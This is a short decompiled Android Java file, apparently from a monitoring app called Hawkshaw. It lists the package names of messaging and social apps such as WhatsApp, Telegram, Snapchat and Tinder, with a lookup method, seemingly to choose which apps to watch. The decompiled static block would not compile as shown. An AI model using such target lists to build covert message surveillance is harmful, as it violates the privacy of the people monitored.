package com.hawkshaw.library.datalayer.models;

import Y1.K;
import d3.C0393a;
import j3.f;
import java.util.Iterator;

public enum PackageName {
    FACEBOOK("com.facebook.katana"),
    FACEBOOK_MESSENGER("com.facebook.orca"),
    WHATSAPP("com.whatsapp"),
    GB_WHATSAPP("com.gbwhatsapp"),
    WHATSAPP_BUSINESS("com.whatsapp.w4b"),
    INSTAGRAM("com.instagram.android"),
    TELEGRAM("org.telegram.messenger"),
    TELEGRAM_WEB("org.telegram.messenger.web"),
    SKYPE("com.skype.raider"),
    KIK("kik.android"),
    WECHAT("com.tencent.mm"),
    LINE("jp.naver.line.android"),
    GMAIL("com.google.android.gm"),
    TINDER("com.tinder"),
    SNAPCHAT("com.snapchat.android"),
    HIKE("com.hike.chat.stickers");
    
    public static final Companion Companion = null;
    private final CharSequence packageName;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }

        public final PackageName from(CharSequence charSequence) {
            Object obj;
            Iterator it = PackageName.getEntries().iterator();
            while (true) {
                if (!it.hasNext()) {
                    obj = null;
                    break;
                }
                obj = it.next();
                if (K.f(((PackageName) obj).getPackageName(), charSequence)) {
                    break;
                }
            }
            return (PackageName) obj;
        }
    }

    static {
        PackageName[] $values;
        $ENTRIES = K.J($values);
        Companion = new Companion((f) null);
    }

    private PackageName(CharSequence charSequence) {
        this.packageName = charSequence;
    }

    public static C0393a getEntries() {
        return $ENTRIES;
    }

    public final CharSequence getPackageName() {
        return this.packageName;
    }
}
